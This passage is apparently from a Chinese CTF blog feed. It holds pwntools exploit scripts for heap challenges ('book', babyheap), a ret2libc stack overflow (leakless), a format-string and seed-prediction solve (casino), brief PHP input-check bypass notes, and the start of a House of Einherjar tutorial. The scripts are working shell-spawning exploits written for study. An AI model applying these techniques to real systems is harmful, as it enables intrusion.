process(&apos;./book&apos;)#[&apos;./book&apos;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;&#125;)</span><br><span class="line">sh =remote(&apos;159.65.68.241&apos;,&apos;10004&apos;)</span><br><span class="line">elf = ELF(&apos;./book&apos;)</span><br><span class="line">libc = ELF(&apos;libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line">def add(a_name,size,b_name):</span><br><span class="line">sh.recvuntil(&apos;Your choice:\n&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;author name?\n&apos;)</span><br><span class="line">sh.sendline(a_name)</span><br><span class="line">sh.recvuntil(&apos;book name?\n&apos;)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(&apos;book?\n&apos;)</span><br><span class="line">sh.sendline(b_name)</span><br><span class="line"></span><br><span class="line">def read(idx):</span><br><span class="line">sh.recvuntil(&apos;Your choice:\n&apos;)</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.recvuntil(&apos;sell?\n&apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">sh.recvuntil(&apos;Your choice:\n&apos;)</span><br><span class="line">sh.sendline(&apos;2&apos;)</span><br><span class="line">sh.recvuntil(&apos;sell?\n&apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(&apos;a&apos;,0,&apos;b&apos;)</span><br><span class="line">add(&apos;c&apos;,0,&apos;d&apos;)</span><br><span class="line">add(&apos;e&apos;,0,&apos;f&apos;)</span><br><span class="line">add(&apos;g&apos;,0,&apos;h&apos;)</span><br><span class="line">add(&apos;i&apos;,0,&apos;j&apos;)</span><br><span class="line">#--------leak heap_base-----------------#</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">add(p64(0)+p64(0x21),0,&apos;b&apos;*0x20)</span><br><span class="line">read(0)</span><br><span class="line">sh.recvuntil(&apos;b&apos;*0x20)</span><br><span class="line">heap_base = u64(sh.recvuntil(&apos;\n&apos;).strip(&apos;\n&apos;).ljust(8,&apos;\x00&apos;))-0x40</span><br><span class="line">print &apos;heap_base : &apos;+hex(heap_base)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">#---------fastbin_attack leak libc_base-----------------#</span><br><span class="line">delete(4)</span><br><span class="line">delete(3)</span><br><span class="line">add(&apos;A&apos;,0,&apos;b&apos;*0x10+p64(0)+p64(0x21)+p64(0x602060))</span><br><span class="line">add(&apos;f&apos;,0,&apos;wwwwwwww&apos;)</span><br><span class="line">add(&apos;a&apos;,0,&apos;a&apos;*0x10+p64(elf.got[&apos;puts&apos;]))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">read(0)</span><br><span class="line">sh.recvuntil(&apos;name:&apos;)</span><br><span class="line">puts_got = u64(sh.recvuntil(&apos;\n&apos;).strip(&apos;\n&apos;).ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc_base = puts_got- libc.symbols[&apos;puts&apos;]</span><br><span class="line">print &apos;libc_base : &apos;+hex(libc_base) </span><br><span class="line">environ_ptr_addr = libc_base + libc.symbols[&apos;_environ&apos;]</span><br><span class="line">print &apos;environ_ptr_addr : &apos;+ hex(environ_ptr_addr)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">#---------get shell-------------------------------#</span><br><span class="line">one_gadget_off = 0x45216</span><br><span class="line">one_gadget_addr = one_gadget_off + libc_base</span><br><span class="line">malloc_hook_addr = libc_base + 0x3c4b10</span><br><span class="line">delete(3)</span><br><span class="line">add(&apos;a&apos;,0,&apos;b&apos;*0x10+p64(environ_ptr_addr))</span><br><span class="line">read(0)</span><br><span class="line">sh.recvuntil(&apos;name:&apos;)</span><br><span class="line">environ_addr = u64(sh.recvuntil(&apos;\n&apos;).strip(&apos;\n&apos;).ljust(8,&apos;\x00&apos;))</span><br><span class="line">rbp_addr = environ_addr-0xf8</span><br><span class="line">print &apos;one_gadget_addr : &apos;+hex(one_gadget_addr)</span><br><span class="line">print &apos;malloc_hook_addr : &apos;+hex(malloc_hook_addr)</span><br><span class="line">print &apos;rbp_addr : &apos;+hex(rbp_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(3)</span><br><span class="line">add(&apos;a&apos;,0,&apos;b&apos;*0x10+p64(0x602070)+p64(0x21)+&apos;b&apos;*0x18+p64(0x41)+&apos;c&apos;*0x20+p64(0x6020b0)+&apos;d&apos;*0x10+p64(0x21))</span><br><span class="line">delete(2)</span><br><span class="line">delete(0)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(&apos;a&apos;,0,&apos;b&apos;*0x10+p64(0x602070)+p64(0x21)+&apos;b&apos;*0x18+p64(0x41)+p64(rbp_addr-0x1e))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(&apos;\n&apos;,0x30,&apos;\n&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(&apos;c&apos;,0x30,&apos;a&apos;*0x16+p64(one_gadget_addr))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(&apos;4&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=process(&quot;./book&quot;)</span><br><span class="line">#p=remote(&quot;159.65.68.241&quot;,&quot;10004&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;,checksec=False)</span><br><span class="line">malloc_hook = libc.symbols[&quot;__malloc_hook&quot;]</span><br><span class="line">def add(name,size,content):</span><br><span class="line">    p.sendlineafter(&quot;choice:&quot;, &quot;1&quot;)</span><br><span class="line">    p.sendlineafter(&quot;name?&quot;,name)</span><br><span class="line">    p.sendlineafter(&quot;name?&quot;,str(size))</span><br><span class="line">    p.sendlineafter(&quot;book&quot;,content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    p.sendlineafter(&quot;choice:&quot;,&quot;2&quot;)</span><br><span class="line">    p.sendlineafter(&quot;sell?&quot;,str(index))</span><br><span class="line"></span><br><span class="line">def read(index):</span><br><span class="line">    p.sendlineafter(&quot;choice:&quot;,&quot;3&quot;)</span><br><span class="line">    p.sendlineafter(&quot;sell?&quot;,str(index))</span><br><span class="line"></span><br><span class="line">code = ELF(&quot;./book&quot;,checksec=False)</span><br><span class="line">puts_got = code.got[&quot;puts&quot;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(&quot;1&quot;,0,&quot;a&quot;)      #0</span><br><span class="line">add(&quot;2&quot;,0x40,&quot;b&quot;)  #1</span><br><span class="line">add(&quot;fence&quot;,0,p64(0xdeadbeef))  #2</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">add(p64(0x51)*2,0,&quot;a&quot;*0x18+p64(0x51)+p64(0x602060))  #0</span><br><span class="line">add(&quot;b&quot;,0x40,&quot;b&quot;)        #1</span><br><span class="line">add(&quot;c&quot;,0x40,&quot;c&quot;*0x10+p64(puts_got))  #3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read(0)</span><br><span class="line">p.recvuntil(&quot;name:&quot;)</span><br><span class="line">puts_addr = p.recv(6)+&quot;\x00&quot;*2</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[&quot;puts&quot;]</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">print(&quot;-------------------&quot;)</span><br><span class="line"></span><br><span class="line">add(&quot;d&quot;,0,&quot;d&quot;)       #4</span><br><span class="line">add(&quot;e&quot;,0x50,&quot;e&quot;)    #5</span><br><span class="line">add(&quot;fence&quot;,0,p64(0xdeadbeef))  #6</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">delete(5) </span><br><span class="line">delete(4)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">add(&quot;d&quot;,0,&quot;d&quot;*0x18+p64(0x61)+p64(0x51)+&quot;123&quot;)  #4</span><br><span class="line">add(&quot;e&quot;,0x50,&quot;e&quot;)    #5</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(&quot;g&quot;,0,&quot;d&quot;)       #6</span><br><span class="line">add(&quot;h&quot;,0x40,&quot;e&quot;)    #7</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(&quot;fence&quot;,0,p64(0xdeadbeef))  #8</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">delete(8)</span><br><span class="line">delete(7)</span><br><span class="line"></span><br><span class="line">add(&quot;g&quot;,0,&quot;g&quot;*0x18+p64(0x51)+p64(libc_base+0x3c4b40)+&quot;123&quot;)  #8</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(&quot;h&quot;,0x40,&quot;g&quot;)   #7</span><br><span class="line">print hex(libc_base+0x3c4b40)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(&quot;i&quot;,0x40,p64(0)*5+p64(libc_base+0x3c4b00))  #9</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(&quot;exp&quot;,0,p64(libc_base+0x4526a))   #10</span><br><span class="line">print hex(libc_base+0x4526a)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;choice:&quot;, &quot;1&quot;)</span><br><span class="line">p.sendlineafter(&quot;name?&quot;,&quot;aaa&quot;)</span><br><span class="line">p.sendlineafter(&quot;name?&quot;,&quot;0&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Fun with PHP Code Audit</title>
      <link href="/2019/01/31/fun-with-php-code-audit/"/>
      <url>/2019/01/31/fun-with-php-code-audit/</url>
      <content type="html"><![CDATA[<p><em>pwn的头疼＋心累，玩一玩入门的PHP代码审计</em></p><h1 id="基础传参"><a href="#基础传参" class="headerlink" title="基础传参"></a>基础传参</h1><p>从最基本的来说，常用的网页传参即 GET 与 POST<br>对于用户来讲，GET传参就是往网页链接后面直接添加参数，比如说<a href="https://test.php?a=1" target="_blank" rel="noopener">https://test.php?a=1</a>;<br>而POST传参一般需要写个脚本或者使用插件，比如说火狐浏览器的hackbar插件。</p><h1 id="简单的PHP函数检测绕过"><a href="#简单的PHP函数检测绕过" class="headerlink" title="简单的PHP函数检测绕过"></a>简单的PHP函数检测绕过</h1><ol><li>is_numeric: 检测是否为数字，但是如果输入 数字＋字母 （1ab）便能过检测，但是 php中 1ab ==1 为true</li><li>extract： 从数组中将变量导入到当前的符号表。使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 但一般若设置为空，则有希望通过判断</li><li>对于数字之间的比较，通常可以使用数组来绕过，比如说 strcmp，strpos，MD5 ，sha1 等对两个用户输入字符串比较的，都可以使用数组尝试</li></ol>]]></content>
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>fireshell-2019-pwn</title>
      <link href="/2019/01/29/fireshell-2019-pwn/"/>
      <url>/2019/01/29/fireshell-2019-pwn/</url>
      <content type="html"><![CDATA[<p><em>本来在之前没搞完的jarvisOJ那边遇到了问题，想问学长来着，结果被拉过来看看这个比赛，被自己菜哭</em></p><h1 id="leakless"><a href="#leakless" class="headerlink" title="leakless"></a>leakless</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char buf; // [esp+0h] [ebp-48h]</span><br><span class="line">return read(0, &amp;buf, 0x100u);</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>一个简单的栈溢出，第一反应是去泄露libc版本，后面又突然想着把shellcode写到bss段，但是奈何总是不成功，vmmap才发现bss段不可执行，且不存在能够wx的段，因为以前用LibcSearcher没成功（ps:完全不记得为什么），偏偏用DynElf爆破失败，所以还是转向LibcSearcher.</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./leakless&apos;)</span><br><span class="line">libc = ELF(&apos;./leakless&apos;)</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*0x48 + &apos;bbbb&apos; + p32(libc.symbols[&apos;puts&apos;])+p32(libc.symbols[&apos;feedme&apos;]) +p32(libc.got[&apos;puts&apos;])</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">puts_got_addr = u32(sh.recv(4))</span><br><span class="line">print &quot;puts_got_addr: &quot;+hex(puts_got_addr)</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(&quot;puts&quot;,puts_got_addr)</span><br><span class="line"></span><br><span class="line">system_addr = puts_got_addr - obj.dump(&apos;puts&apos;)+obj.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr = puts_got_addr - obj.dump(&apos;puts&apos;) + obj.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"> </span><br><span class="line">success( &quot;system_addr: &quot;+hex(system_addr))</span><br><span class="line">success(&quot;binsh_addr: &quot;+hex(binsh_addr))</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*0x48 + &apos;bbbb&apos; + p32(system_addr) + p32(libc.symbols[&apos;main&apos;]) + p32(binsh_addr)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="casino"><a href="#casino" class="headerlink" title="casino"></a>casino</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>用户输入的值与随机数匹配成功100次，之后会读取flag.txt文件并输出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">seed = (unsigned int)time(0LL) / 10;</span><br><span class="line">seed += bet;(bet=1)</span><br><span class="line">srand(seed);</span><br><span class="line">rand();</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>格式化字符串漏洞，但是大小限制在了0x10，能够泄露出来seed，也就能预测第一次的值，然后因为要泄露100次，想着顺便把栈上的记录次数的值或者bet一起改掉，但是因为长度限制，最后有点懵。感觉二者不可得兼。</p><p>看大佬们的wp，因为seed是用time(0)/10+ bet ,可以先自己先利用time将seed计算出来，然后计算rand();因为python和c的rand()不同，所以得考虑如何将在python脚本中计算c的随机数，可以有：</p><ol><li>单独写一份c的程序计算随机数，脚本中调用c程序(昨天也是这么做的)； </li><li>使用python和c的混合编程包：ctypes。</li></ol><p>经实践，同一个seed得到的随机数序列都是一样的…，而题中通过time(0)/10对seed给了容错</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><ol><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from time import *</span><br><span class="line"></span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">now=int(time())/10+2</span><br><span class="line"></span><br><span class="line">sh=process(&quot;./timerand&quot;)</span><br><span class="line"></span><br><span class="line">###</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">int seed;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;seed);</span><br><span class="line">srand(seed);</span><br><span class="line">for(i = 0; i &lt; 100; i++)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%d &quot;,rand());</span><br><span class="line">   &#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">###</span><br><span class="line"></span><br><span class="line">sh.sendline(str(now))</span><br><span class="line">rand=sh.recvuntil(&quot;\n&quot;).strip().split(&quot; &quot;)</span><br><span class="line">print rand</span><br><span class="line">sh.close()</span><br><span class="line"></span><br><span class="line">#sleep(0.5)</span><br><span class="line"></span><br><span class="line">#sh=remote(&quot;challs.fireshellsecurity.team&quot;,31006)</span><br><span class="line">sh=process(&apos;./casino&apos;)</span><br><span class="line">sh.sendafter(&quot;What is your name? &quot;,&quot;aa%11$hn&quot;+p64(0x602020))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">for i in range(99):</span><br><span class="line">   sh.sendlineafter(&quot;number: &quot;,rand[i])</span><br><span class="line">print sh.recv()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import cdll</span><br><span class="line"></span><br><span class="line">sh = process(&quot;./casino&quot;)</span><br><span class="line">sh.recvuntil(&apos;What is your name? &apos;)</span><br><span class="line">sh.send(&quot;%8$p&quot;)</span><br><span class="line">sh.recvuntil(&apos;Welcome &apos;)</span><br><span class="line">seed =eval(sh.recvuntil(&apos;\n&apos;,drop=True))&amp;0xffffffff  &lt;--- 数据类型转换成int型</span><br><span class="line">print seed</span><br><span class="line">sh.close()</span><br><span class="line">seed += 3       &lt;----还是不清楚这个3怎么计算出来的，或许是因为两个程序打开具有延迟？？</span><br><span class="line">libc = cdll.LoadLibrary(&quot;&quot;)   &lt;--- 突然发现这里为空也不影响？？</span><br><span class="line">libc.srand(seed)</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./casino&apos;)</span><br><span class="line">pay = &apos;aaa%11$n&apos;+p64(0x602020)</span><br><span class="line">sh.recvuntil(&apos;What is your name? &apos;)</span><br><span class="line">sh.send(pay)</span><br><span class="line">for i in range(99):</span><br><span class="line">sh.sendlineafter(&quot;Guess my number: &quot;,str(libc.rand()))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">int create()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  buf = malloc(0x60uLL);</span><br><span class="line">  result = puts(&quot;Done!&quot;);</span><br><span class="line">  create_inuse = 1LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ssize_t edit()</span><br><span class="line">&#123;</span><br><span class="line">  ssize_t result; // rax</span><br><span class="line"></span><br><span class="line">  printf(&quot;Content? &quot;);</span><br><span class="line">  result = read(0, buf, 0x40uLL);</span><br><span class="line">  edit_inuse = 1LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int show()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  result = printf(&quot;Content: %s\n&quot;, buf);</span><br><span class="line">  show_inuse = 1LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int delete()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  free(buf);                                    // UAF</span><br><span class="line">  result = puts(&quot;Done!&quot;);</span><br><span class="line">  create_inuse = 0LL;</span><br><span class="line">  delete_inuse = 1LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 fill()</span><br><span class="line">&#123;</span><br><span class="line">  buf = malloc(0x60uLL);</span><br><span class="line">  printf(&quot;Fill &quot;);</span><br><span class="line">  read(0, buf, 0x40uLL);</span><br><span class="line">  return fill_inuse++ + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>各项功能除了次数检查基本没有限制，所以在有限的步骤内将chunk分配到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000006020A0 create_inuse   </span><br><span class="line">.bss:00000000006020A8 edit_inuse   </span><br><span class="line">.bss:00000000006020B0 show_inuse      </span><br><span class="line">.bss:00000000006020B8 delete_inuse    </span><br><span class="line">.bss:00000000006020C0 fill_inuse     </span><br><span class="line">.bss:00000000006020C8 ; void *buf</span><br></pre></td></tr></table></figure><p>我们可以使用UAF漏洞＋fastbinattack达到目的，这样不仅消除了次数限制问题，同时可以随意修改指针<br>所以之后便是先泄露libc基址，之后修改atoi.got表为system,输入’/bin/sh’即可</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">def new():</span><br><span class="line">  sh.sendlineafter(&quot;&gt; &quot;,&quot;1&quot;)</span><br><span class="line"></span><br><span class="line">def edit(note):</span><br><span class="line">  sh.sendlineafter(&quot;&gt; &quot;,&quot;2&quot;)</span><br><span class="line">  sh.sendafter(&quot;Content? &quot;,note)</span><br><span class="line"></span><br><span class="line">def delete():</span><br><span class="line">  sh.sendlineafter(&quot;&gt; &quot;,&quot;4&quot;)</span><br><span class="line"></span><br><span class="line">def  show():</span><br><span class="line">  sh.sendlineafter(&quot;&gt; &quot;,&quot;3&quot;)</span><br><span class="line">  sh.recvuntil(&quot;Content: &quot;)</span><br><span class="line">  return sh.recvuntil(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">def  fill(note):</span><br><span class="line">  sh.sendlineafter(&quot;&gt; &quot;,&quot;1337&quot;)</span><br><span class="line">  sh.sendafter(&quot;Fill &quot;,note)</span><br><span class="line"></span><br><span class="line">sh=process(&quot;./babyheap&quot;)</span><br><span class="line">elf = ELF(&quot;./babyheap&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">new()</span><br><span class="line">delete()</span><br><span class="line">edit(p64(0x602095-8))</span><br><span class="line">new()</span><br><span class="line">fill(&apos;/bin/sh&apos;+chr(0)+&apos;a&apos;*0x33+p64(0x602060)[0:3])</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.recvuntil(&apos;Content: &apos;)</span><br><span class="line">libc_addr = u64(sh.recvuntil(&apos;\n&apos;)[:-1].ljust(8,&apos;\x00&apos;))-libc.plt[&apos;atoi&apos;]</span><br><span class="line">print &quot;libc_addr : &quot; + hex(libc_addr)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">system_addr = libc_addr + libc.plt[&apos;system&apos;]</span><br><span class="line"></span><br><span class="line">edit(p64(system_addr))</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn2.8-HouseOfEinherjar</title>
      <link href="/2019/01/24/introduction-to-pwn2-8-houseofeinherjar/"/>
      <url>/2019/01/24/introduction-to-pwn2-8-houseofeinherjar/</url>
      <content type="html"><![CDATA[<h1 id="House-of-Einherjar-原理"><a href="#House-of-Einherjar-原理" class="headerlink" title="House of Einherjar 原理"></a>House of Einherjar 原理</h1><p>感觉像是把好几种漏洞结合起来：<br>    off by one<br>    unlink （需要能够完全溢出到下一个堆来控制<br>    chunk entend or shrink; 但是细节却不相同。</p><p>该利用需要：</p><ol><li>chunk能够覆盖next_chunk的pre_size并修改pre_inuse位</li><li>泄露地址使得unlink 检查pre_size与size时能够绕过</li><li>fake_chunk的fd 与 bk指针需要能够绕过检查</li></ol><p>当我们能够覆盖nextchunk的pre_size位及pre_inuse位时，我们便可以伪造fake_chunk，之后在free next_chunk时，fake_chunk通过伪造便能绕过检查被置入bin中</p><h1 id="Tinypad"><a href="#Tinypad" class="headerlink" title="Tinypad"></a>Tinypad</h1><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>程序自己重写了许多write read函数<br>主要功能 add edit delete</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 